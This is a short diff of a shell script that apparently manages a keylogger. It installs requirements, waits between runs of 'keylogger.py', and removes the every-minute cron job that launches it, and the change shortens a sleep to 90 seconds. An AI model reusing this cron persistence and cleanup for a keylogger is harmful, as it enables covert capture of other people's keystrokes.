@@ -14,7 +14,7 @@ python3 -m pip install -r requirements.txt
 
 
 # sleep for 90 seconds, 30 seconds before the second call of the keylogger file
-#sleep 120
+sleep 90
 
 # rm cronjob
 crontab -u $USER -l | grep -v '* * * * * python3 keylogger.py'  | crontab -u $USER -
